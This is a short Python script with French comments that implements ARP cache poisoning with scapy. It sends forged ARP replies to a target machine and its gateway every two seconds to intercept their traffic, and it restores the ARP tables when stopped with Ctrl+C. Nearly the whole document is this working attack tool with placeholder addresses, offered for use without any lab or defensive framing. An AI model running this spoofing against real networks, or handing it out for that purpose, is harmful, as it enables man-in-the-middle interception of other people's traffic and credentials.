#!/usr/bin/env python3
"""
ARP Poisoner minimaliste
Fonctionnalités :
- Empoisonnement ARP entre une cible et une passerelle
- Gestion basique des erreurs
- Arrêt propre avec Ctrl+C
"""

from scapy.all import ARP, send
import time
import signal
import sys

# Configuration
TARGET_IP = "X.X.X.x"  # IP de la machine cible
GATEWAY_IP = "X.X.X.X"  # IP de la passerelle (routeur)
INTERFACE = "eth0"  # Interface réseau

def get_mac(ip):
    """Résolution d'adresse MAC"""
    from scapy.all import getmacbyip
    mac = getmacbyip(ip)
    if not mac:
        print(f"Erreur : Impossible de trouver MAC pour {ip}")
        sys.exit(1)
    return mac

def arp_poison(target_ip, gateway_ip, interface):
    """Fonction d'empoisonnement ARP"""
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    print(f"ARP poisoning démarré entre {target_ip} et {gateway_ip}... (Ctrl+C pour arrêter)")

    try:
        while True:
            # Poison target (envoie un ARP forgé à la cible)
            send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac), iface=interface, verbose=False)
            # Poison gateway (envoie un ARP forgé à la passerelle)
            send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac), iface=interface, verbose=False)
            time.sleep(2)  # Envoie des paquets ARP toutes les 2 secondes
    except KeyboardInterrupt:
        print("\nArrêt de l'ARP poisoning...")

def restore_arp(target_ip, gateway_ip, interface):
    """Restauration des tables ARP"""
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    print("Restauration des tables ARP...")

    # Envoie des paquets ARP corrects pour rétablir les tables ARP
    send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), iface=interface, verbose=False)
    send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), iface=interface, verbose=False)

def signal_handler(sig, frame):
    """Gestion de l'arrêt avec Ctrl+C"""
    restore_arp(TARGET_IP, GATEWAY_IP, INTERFACE)
    sys.exit(0)

if __name__ == "__main__":
    # Configuration du gestionnaire de signal pour Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)

    # Démarrage de l'ARP poisoning
    arp_poison(TARGET_IP, GATEWAY_IP, INTERFACE)
